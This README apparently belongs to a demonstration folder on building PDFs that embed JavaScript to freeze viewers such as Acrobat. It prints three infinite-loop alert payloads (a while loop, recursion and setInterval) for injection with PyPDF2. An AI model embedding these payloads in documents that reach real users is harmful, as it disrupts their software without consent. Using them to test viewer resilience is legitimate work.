# PDF Corruption Demonstration

This folder demonstrates methods to create intentionally corrupted PDF files, particularly by embedding JavaScript actions that trigger infinite loops. These techniques can be useful for research, testing PDF viewer resilience, or exploring PDF manipulation.

## Overview

PDF files are widely used for document sharing, but they can be vulnerable to certain types of "corruption" through embedded JavaScript actions. This folder focuses on adding JavaScript payloads that cause infinite loops, effectively "freezing" or disrupting PDF viewers that support JavaScript execution.

The techniques used here are primarily for educational and research purposes, aiming to highlight potential issues with PDF viewers' handling of embedded JavaScript.

**Note**: Not all PDF viewers support JavaScript, and some have protections against infinite loops and similar issues. These methods work best in environments where JavaScript is fully supported, like Adobe Acrobat.

## Features

- **PDF Creation**: Generates PDFs with custom content using Python libraries.
- **JavaScript Injection**: Embeds various JavaScript payloads to create infinite loops.
- **Corruption Techniques**: Showcases multiple approaches to disrupt the viewer experience using JavaScript.

## Usage

1. **Generate the Base PDF**: Use ReportLab to create an initial PDF file with basic content.
2. **Inject JavaScript**: Once the PDF is created, use PyPDF2 to inject JavaScript actions that trigger infinite loops.

## Example JavaScript Payloads

Below are some JavaScript payloads that can be embedded in the PDF to create infinite loops. Each of these examples uses different methods to create a "frozen" effect, preventing users from further interacting with the document:

- **Basic While Loop**: A simple loop with an alert.

  ```javascript
  while (true) {
    app.alert("Infinite loop alert!");
  }
  ```

- **Recursive Call**: Creates an infinite loop using recursive function calls.

  ```javascript
  function loop() {
    app.alert("Recursive alert loop");
    loop();
  }
  loop();
  ```

- **setInterval Loop**: Triggers a prompt every second indefinitely.
  ```javascript
  setInterval(function () {
    app.alert("Infinite loop alert with setInterval");
  }, 1000);
  ```

Each of these payloads can be tested by modifying the JavaScript injection in the script.

## Important Notes

- **Viewer Compatibility**: These methods rely on PDF viewers that support JavaScript, such as Adobe Acrobat. Many PDF readers have limited JavaScript support or prevent infinite loops.
- **For Educational Purposes Only**: This folder is intended solely for educational and testing purposes. Use responsibly and avoid using this code on documents intended for distribution.
